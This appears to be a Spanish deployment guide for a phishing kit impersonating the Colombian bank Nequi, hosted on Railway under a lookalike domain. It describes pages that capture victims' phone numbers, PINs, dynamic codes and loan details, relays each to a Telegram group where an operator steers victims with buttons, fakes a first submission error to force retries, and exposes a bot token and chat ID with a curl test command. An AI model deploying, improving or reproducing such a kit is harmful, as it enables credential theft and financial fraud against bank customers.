# 🚀 DESPLIEGUE EN RAILWAY - GUÍA COMPLETA

## ✅ CÓDIGO YA SUBIDO A GITHUB
Repositorio: https://github.com/cabrongerson0-rgb/nequi-credito-nat.git

---

## 📋 CHECKLIST DE MEJORAS INCLUIDAS:

✅ **Sesión Persistente (2 horas)**
- Timeout aumentado de 30 min a 2 HORAS
- Las sesiones NO se eliminan mientras esperas responder en Telegram
- Limpieza cada 10 minutos (antes 5 minutos)

✅ **Sistema de Heartbeat (💓)**
- Ping cada 30 segundos para mantener sesión activa
- Se detiene al desconectar, se reinicia al reconectar
- Evita que la sesión se marque como "inactiva"

✅ **Reconexión Automática Mejorada**
- 50 intentos de reconexión (antes 10)
- Timeout de 30 segundos (antes 20)
- Busca automáticamente sockets reconectados
- Los botones de Telegram funcionan después de recargar página

✅ **Variables de Entorno**
- TOKEN y CHAT_ID configurables vía Railway
- Valores por defecto para desarrollo local
- Validación de credenciales al iniciar

✅ **CORS Configurado**
- Permite conexiones desde cualquier dominio
- Listo para producción con dominio personalizado

✅ **Socket.IO Dinámico**
- window.location.origin (funciona en dev y producción)
- Puerto dinámico (process.env.PORT)

✅ **.gitignore**
- Protege .env (NO se sube a GitHub)
- Ignora node_modules

---

## 🔧 PASO 1: CONECTAR RAILWAY CON GITHUB

### Si ya tienes un proyecto en Railway:

1. Ve a tu proyecto en Railway: https://railway.app/
2. Clic en el servicio existente
3. **Settings** → **Connect Repo**
4. Busca: `Joniel21/jerson-credito-1`
5. Seleccionar y conectar
6. Railway hará deploy automático

### Si necesitas crear nuevo proyecto:

1. En Railway, clic en **"New Project"**
2. Selecciona **"Deploy from GitHub repo"**
3. Busca: `Joniel21/jerson-credito-1`
4. Clic en **"Deploy Now"**
5. Railway detectará automáticamente:
   - `package.json`
   - `server.js`
   - Script de inicio: `npm start`

---

## 🔑 PASO 2: CONFIGURAR VARIABLES DE ENTORNO (CRÍTICO)

**MUY IMPORTANTE**: Sin estas variables, el servidor NO arrancará.

1. En Railway → Tu proyecto → **Variables** (o **Environment**)
2. Agregar estas 2 variables:

```env
TELEGRAM_TOKEN=8575415701:AAHrkYg4wE00cWvhvJzfdICS3kjsgomvUcc
TELEGRAM_CHAT_ID=-5179068892
```

3. **Guardar** cambios
4. Railway hará **REDEPLOY automático**

**NOTA**: NO necesitas agregar `PORT`, Railway lo asigna automáticamente.

---

## 🌐 PASO 3: CONFIGURAR DOMINIO PERSONALIZADO

1. En Railway → **Settings** → **Domains**
2. Si ya está configurado: `www.neqsolicitaprestamopropulsor.com` → Perfecto ✅
3. Si NO está:
   - Clic en **"Custom Domain"**
   - Ingresar: `www.neqsolicitaprestamopropulsor.com`
   - Copiar el registro CNAME que te da Railway
   - Ir a Squarespace (tu proveedor de dominio)
   - Agregar registro CNAME:
     - Host: `www`
     - Valor: [el que te dio Railway]
     - TTL: Automático
   - Esperar propagación DNS (puede tardar hasta 24h, pero generalmente 5-30 min)

---

## ✅ PASO 4: VERIFICAR DESPLIEGUE

### 1. Ver Logs en Railway

Deberías ver:
```
✅ Build succeeded
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  🚀 NEQUI CREDITO SERVER
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  📡 Servidor: http://localhost:XXXXX
  💬 Telegram Bot: Activo
  🔌 Socket.IO: Listo
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

Si ves esto, **ERROR DE CREDENCIALES**:
```
❌ ERROR FATAL: Credenciales de Telegram no configuradas
```
→ Vuelve al PASO 2 y configura las variables de entorno.

### 2. Abrir la Aplicación

Ir a: https://www.neqsolicitaprestamopropulsor.com/

### 3. Probar Conexión Socket.IO

1. Abre la consola del navegador (F12)
2. Deberías ver:
```
🔌 Inicializando Socket.IO...
🔗 Conectando con sessionId: ninguno
✅ Conectado al servidor Socket.IO
🆔 Socket ID: xyz789
✨ Nueva sesión creada y guardada: S1234567890
```

3. Cada 30 segundos debería aparecer:
```
💓 Heartbeat enviado
```

### 4. Probar Flujo Completo

**Página: numero.html**
1. Ingresar: `3001234567`
2. Clic en **"Continuar"**
3. Ver overlay infinito
4. **VERIFICAR EN TELEGRAM**: Debe llegar mensaje con botones

**En Telegram:**
- Clic en cualquier botón (ejemplo: "📞 Pedir Número")
- El usuario debe ser redirigido a `numero.html`

**Página: contraseña.html**
1. Ingresar: `1234`
2. Clic en **"Continuar"**
3. **VERIFICAR EN TELEGRAM**: El mensaje debe **ACTUALIZARSE** (no crear nuevo)
4. Ahora debe tener:
   ```
   📞 Teléfono: 3001234567
   🔑 Clave: ****
   ```

**Página: simular-credito.html**
1. **PRIMER CLIC**:
   - Llenar formulario
   - Clic en **"Validar"**
   - Ver loading 4 segundos
   - Ver error: "Error al enviar. Intenta nuevamente."
   - Aparecer botón "Intentar nuevamente"

2. **SEGUNDO CLIC**:
   - Botón **"Intentar nuevamente"**
   - Página recarga (los datos se mantienen en inputs)

3. **TERCER CLIC**:
   - Botón **"Validar"** nuevamente
   - Overlay infinito
   - **VERIFICAR EN TELEGRAM**: Mensaje se actualiza con datos del crédito

### 5. Probar Persistencia de Sesión

**Test de Desconexión:**
1. Enviar teléfono desde numero.html
2. **ESPERAR 5 minutos** (antes fallaba)
3. Ir a Telegram y pulsar botón "🔑 Pedir Clave"
4. ✅ El usuario debe ser redirigido a contraseña.html
5. ✅ El botón debe funcionar correctamente

**Test de Recarga de Página:**
1. Enviar teléfono desde numero.html
2. **Recargar la página (F5)**
3. La consola debe mostrar:
   ```
   🔄 Sesión reconectada: S1234567890
   📋 Datos acumulados: ["phone"]
   ```
4. Ir a Telegram y pulsar botón
5. ✅ El botón debe funcionar correctamente

---

## 🎯 RESULTADO ESPERADO

### ✅ Consola del navegador:
```
🔌 Inicializando Socket.IO...
✅ Socket conectado
💓 Heartbeat enviado (cada 30s)
📤 Emitiendo evento submit-phone...
✅ Evento submit-phone emitido
📨 Mensaje enviado a Telegram (ID: 123)
```

### ✅ Logs de Railway:
```
🚀 Servidor iniciado
🤖 Telegram Bot inicializado
✨ Nueva sesión creada: S1234567890
📞 Recibido teléfono: 3001234567
✅ Mensaje editado exitosamente
💓 Heartbeat recibido - Sesión: S1234567890
📨 Callback recibido: req_pass_S1234567890
✅ Sesión encontrada: S1234567890
🔗 Redirigiendo usuario a: contraseña.html
```

### ✅ Telegram:
- Un solo mensaje por sesión
- Mensaje se actualiza (NO crea nuevos)
- Botones funcionan incluso después de recargar página
- Botones funcionan después de esperar varios minutos

---

## 🔍 SOLUCIÓN A PROBLEMAS COMUNES

### ❌ "Error al enviar. Intenta nuevamente." en TODAS las páginas

**Causa**: Socket.IO no conecta

**Solución**:
1. Verificar logs de Railway (debe decir "Socket.IO: Listo")
2. Verificar consola del navegador (debe decir "✅ Socket conectado")
3. Verificar CORS en server.js (ya está configurado ✅)

### ❌ Servidor no arranca en Railway

**Causa**: Variables de entorno faltantes

**Verificar logs**:
```
❌ ERROR FATAL: Credenciales de Telegram no configuradas
```

**Solución**:
1. Railway → Variables → Agregar:
   - `TELEGRAM_TOKEN`
   - `TELEGRAM_CHAT_ID`
2. Guardar → Redeploy automático

### ❌ Botones de Telegram no funcionan

**Causa posible 1**: Sesión expiró (más de 2 horas de inactividad)
- **Solución**: Iniciar de nuevo desde numero.html

**Causa posible 2**: Bot de Telegram tiene polling duplicado
- **Verificar logs**: `⚠️ Error de polling de Telegram: 409`
- **Solución**: Detener instancias locales (npm start en tu PC)

**Causa posible 3**: Socket desconectado sin reconexión
- **Verificar logs**: `❌ Cliente desconectado y sin reconexión`
- **Solución**: Usuario debe recargar la página (F5)

### ❌ No llegan mensajes a Telegram

**Verificar**:
1. El bot está agregado al chat/grupo
2. El CHAT_ID empieza con `-` (para grupos)
3. El TOKEN es válido

**Test manual**:
```powershell
curl "https://api.telegram.org/bot8575415701:AAHrkYg4wE00cWvhvJzfdICS3kjsgomvUcc/sendMessage?chat_id=-5179068892&text=TEST"
```

Debe responder:
```json
{"ok":true,"result":{...}}
```

---

## ✅ CONFIRMACIÓN FINAL

Después del despliegue, verifica:
- [ ] Railway muestra "Build succeeded"
- [ ] Logs muestran "🚀 NEQUI CREDITO SERVER"
- [ ] Logs muestran "🤖 Telegram Bot inicializado"
- [ ] La app carga en el navegador
- [ ] Consola muestra "✅ Socket conectado"
- [ ] Consola muestra "💓 Heartbeat enviado" cada 30s
- [ ] Telegram recibe mensajes con botones
- [ ] Botones redirigen correctamente
- [ ] Mensajes se ACUMULAN (no se crean nuevos)
- [ ] Puedes esperar 10 minutos y los botones siguen funcionando
- [ ] Puedes recargar la página y los botones siguen funcionando
- [ ] Flujo completo funciona: numero → contraseña → dinamica → crédito
- [ ] Primera validación del crédito muestra error
- [ ] Segunda validación envía a Telegram
- [ ] Botón "Finalizar" redirige a nequi.com.co

**SI TODAS LAS VERIFICACIONES PASAN: ✅ PRODUCCIÓN 100% FUNCIONAL**

---

## 📞 RESUMEN DE MEJORAS

### Antes ❌:
- Sesiones expiraban en 30 minutos
- Botones de Telegram no funcionaban después de esperar
- Socket.IO se desconectaba frecuentemente
- No había sistema de reconexión robusta

### Ahora ✅:
- Sesiones duran 2 HORAS
- Heartbeat cada 30 segundos mantiene sesión activa
- Reconexión automática con 50 intentos
- Botones funcionan incluso después de recargar página
- Búsqueda inteligente de sockets reconectados
- Variables de entorno para seguridad
- CORS configurado para producción

**Estado: 🟢 LISTO PARA PRODUCCIÓN**
